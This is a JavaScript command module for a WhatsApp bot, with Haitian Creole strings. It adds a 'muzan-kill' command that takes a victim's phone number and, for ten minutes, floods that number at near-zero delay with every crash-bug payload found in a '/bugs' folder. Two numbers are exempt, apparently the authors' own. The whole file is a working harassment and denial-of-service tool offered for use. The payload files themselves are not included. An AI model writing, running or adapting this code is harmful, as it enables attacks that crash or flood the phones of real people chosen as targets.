const { cmd } = require('../command');
const config = require('../config');
const fs = require('fs');
const path = require('path');

cmd({
  pattern: 'muzan-kill',
  desc: '🔪 Muzan Kill - atak 10 minit ak ultra speed',
  category: 'bug',
  react: '🔪',
  filename: __filename
}, async (bot, mek, m, { from, reply }) => {
  try {
    const prefix = config.PREFIX;
    const body = m.body || '';
    const cmdName = body.startsWith(prefix)
      ? body.slice(prefix.length).trim().split(' ')[0].toLowerCase()
      : '';
    if (cmdName !== 'muzan-kill') return;

    const args = body.trim().split(/\s+/).slice(1);
    const targetNumber = args[0];

    if (!targetNumber || isNaN(targetNumber)) {
      return await reply(`❌ Usage:\n${prefix}muzan-kill <numero>`);
    }

    const protectedNumbers = ['13058962443', '50942241547'];
    if (protectedNumbers.includes(targetNumber)) {
      return await reply('🛡️ Nimewo sa pwoteje. Atak refize.');
    }

    const targetJid = `${targetNumber}@s.whatsapp.net`;
    const bugsPath = path.join(__dirname, '../bugs');
    const bugFiles = fs.readdirSync(bugsPath).filter(f => f.endsWith('.js'));

    if (bugFiles.length === 0) {
      return await reply('📁 Pa gen payload nan folder `/bugs`.');
    }

    // Send image first
    const imgPath = path.join(__dirname, '../media/5.png');
    const imgBuffer = fs.readFileSync(imgPath);
    await bot.sendMessage(from, {
      image: imgBuffer,
      caption: `🩸 *muzan-kill ACTIVE*\n👤 Target: wa.me/${targetNumber}\n⏱️ Duration: 10 minutes\n⚡ Speed: Ultra\n📦 Payloads: ${bugFiles.length}`,
    }, { quoted: mek });

    const endTime = Date.now() + 10 * 60 * 1000;

    while (Date.now() < endTime) {
      for (const file of bugFiles) {
        try {
          const filePath = path.join(bugsPath, file);
          let payload = require(filePath);

          if (typeof payload === 'object' && typeof payload.default === 'string') {
            const msg = payload.default;
            payload = async (bot, number) => {
              await bot.sendMessage(`${number}@s.whatsapp.net`, { text: msg });
            };
          }

          if (typeof payload === 'string') {
            const msg = payload;
            payload = async (bot, number) => {
              await bot.sendMessage(`${number}@s.whatsapp.net`, { text: msg });
            };
          }

          if (typeof payload === 'function') {
            await payload(bot, targetNumber);
          }

        } catch (e) {
          console.error(`❌ Error nan ${file}:`, e.message);
        }

        await new Promise(res => setTimeout(res, 0.2)); // 0.2ms delay — killing fast
      }
    }

    await reply(`✅ *muzan-kill* fini ak +${targetNumber}`);

  } catch (err) {
    console.error(err);
    reply(`❌ Error: ${err.message}`);
  }
});